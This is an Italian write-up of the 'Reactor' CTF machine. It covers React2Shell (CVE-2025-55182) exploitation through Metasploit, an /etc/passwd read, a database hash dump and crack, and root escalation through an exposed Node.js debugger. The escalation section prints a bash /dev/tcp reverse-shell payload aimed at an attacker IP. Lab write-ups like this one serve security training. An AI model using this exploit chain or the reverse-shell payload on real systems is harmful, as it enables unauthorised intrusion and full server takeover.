+++
date = '2026-09-29T13:28:55+02:00'
draft = false
title = 'Reactor Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`24/05/2026`**

![pwn.jpeg](/images/imgs_reactor/pwn.jpeg)

---
# Introduzione

**_Reactor_** è la prima macchina rilasciata durante la **Season 11**.
È una macchina **Linux** di livello **Easy** che tratta lo sfruttamento di una recente vulnerabilità nelle applicazioni **Next.js/React: React2Shell (CVE-2025-55182)**.

In questo caso, la vulnerabilità viene abusata tramite **Metasploit**, per ottenere una shell come utente **node**.

La privilege escalation richiede inizialmente un movimento laterale verso l'utente **engineer** effettuando il dump di un database interno e craccando il relativo hash, e successivamente un'escalation verticale a **root** abusando di un servizio **Node.js debugger** esposto localmente.

---
# Tecniche Utilizzate

- **React2Shell (CVE-2025-55182) → RCE**

- **Database Dump → Hash Cracking**

- **Node.js Debugger Abuse → Root RCE**

---
# Enumerazione

## nmap

Scansione mirata con script e rilevamento dei servizi:

```bash
nmap -sC -sV -p- -vvv reactor.htb
```

```text
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIoh32XcLYi0Kdad12SajqVyUVXfkDPaB7zZCDCMIJc+fv8JUJwyQRoqX/91+p6uD75Ggdp4VNzA7WasIkyo/4U=
|   256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPws9RyzoCW2cXzOFxeZCCt8rWcNu2umX2kqLLK6T+7H
3000/tcp  open  ppp?     syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: Next.js
|     Content-Type: text/html; charset=utf-8
```

**Porte Aperte**:

- **22**/tcp SSH

- **3000**/tcp HTTP (**`Next.js/React`**)

## HTTP - Enumerazione Web

Navigando sulla porta **`3000`**, troviamo un'applicazione web basata su **React**.

![reactor_web.png](/images/imgs_reactor/reactor_web.png)

Dato il nome del box e l'applicazione basata su **React**, ho subito sospettato che potesse essere vulnerabile a **React2Shell (CVE-2025-55182)**.

**Nota**: _Questa è una gravissima vulnerabilità di **Remote Code Execution** non autenticata che affligge specifiche versioni del framework **`Next.js`**. Il problema deriva da un'impropria gestione e sanitizzazione dei dati forniti dall'utente durante il **Server-Side Rendering** (**SSR**) o nel parsing delle richieste interne. Inviando una richiesta HTTP appositamente manipolata, un attaccante può forzare il backend **`Node.js`** a interpretare ed **eseguire codice arbitrario**, compromettendo completamente il server ospitante._

---
# Accesso Iniziale | React2Shell → RCE

Un rapido test ha confermato l'ipotesi. Ho avviato **Metasploit** e cercato il modulo specifico.

```bash
msfconsole
msf6 > search react2shell
msf6 > use exploit/multi/http/react2shell_unauth_rce_cve_2025_55182
msf6 > set RHOSTS reactor.htb
msf6 > set RPORT 3000
msf6 > set LHOST <attacker_ip>
msf6 > exploit
```

L'exploit mi ha garantito una sessione **Meterpreter** come utente **`node`**.

![initial_access.png](/images/imgs_reactor/initial_access.png)

---
# Lateral Movement | Database Dump → Hash Cracking → engineer

Ho recuperato il file **`/etc/passwd`** per vedere quali utenti fossero presenti sulla macchina.

![passwd.png](/images/imgs_reactor/passwd.png)

Esplorando il file system, ho trovato e scaricato il database interno.

![db_find.png](/images/imgs_reactor/db_find.png)

Ho estratto l'hash della password per l'utente **`engineer`**.

![db_dump.png](/images/imgs_reactor/db_dump.png)

L'ho craccato utilizzando [CrackStation](https://crackstation.net/).

![crackstation.png](/images/imgs_reactor/crackstation.png)

Ho quindi utilizzato le credenziali recuperate per accedere tramite **SSH**:

```bash
ssh engineer@reactor.htb
```

All'interno della home directory, ho trovato la **user flag**:

![lateral_user_flag.png](/images/imgs_reactor/lateral_user_flag.png)

---
# Privilege Escalation | Node.js Debugger Abuse → root

Ho iniziato l'enumerazione locale. **linpeas** non ha prodotto nulla di immediatamente sfruttabile, e gli exploit per il kernel come **`Dirty Pipe/Dirty Frag`** erano patchati.

Ho quindi controllato le porte interne in ascolto:

```bash
ss -tuln
```

![tunnel.png](/images/imgs_reactor/tunnel.png)

La porta **`9229`** ha catturato la mia attenzione. Questa è la porta di default per il **`Node.js Inspector (Debugger)`**.

![inspect_process.png](/images/imgs_reactor/inspect_process.png)

Inizialmente, ho provato a fare **port forwarding** tramite **SSH** per accedervi dal mio browser, ma non era possibile nessuna interazione web-based.

![9229.png](/images/imgs_reactor/9229.png)

![noresponse.png](/images/imgs_reactor/noresponse.png)

Dopo alcune ricerche su come sfruttare un **debugger `Node.js`**, ho scoperto che è possibile interagirvi direttamente dalla **CLI** per **eseguire codice JavaScript arbitrario**.

Utilizzando il comando integrato **`node inspect`**, mi sono connesso al debugger locale:

```bash
node inspect 127.0.0.1:9229
```

Una volta all'interno della sessione di debugging, possiamo eseguire comandi di sistema sfruttando il modulo **`child_process`**. Ho creato un payload per innescare una reverse shell verso la mia macchina attaccante:

```javascript
exec("process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/<attacker_ip>/22667 0>&1\"')")
```

Dopo aver configurato un listener **netcat** ed eseguito il payload nella console dell'inspector, ho ottenuto una shell come **root**:

![privesc.png](/images/imgs_reactor/privesc.png)

**Root flag** in **`/root`**.

---
# Considerazioni Finali

Una macchina molto semplice, ma divertente.

L'accesso iniziale era fortemente suggerito dal nome stesso della macchina. Individuare un'applicazione **React** su un box chiamato **_Reactor_** ha immediatamente ristretto la superficie d'attacco, portando dritti alla recente **CVE React2Shell**. È un classico scenario CTF in cui l'intuito ti fa risparmiare ore di enumerazione alla cieca.

La privilege escalation è il vero pezzo forte. Trovare e abusare di un **Node.js debugger** esposto su una porta interna è un vettore molto realistico.

**Fonti**:

- **React2Shell Exploit Info | https://react2shell.com/**

- **Node.js Debugger Exploitation | https://hacktricks.wiki/en/linux-hardening/software-information/electron-cef-chromium-debugger-abuse.html**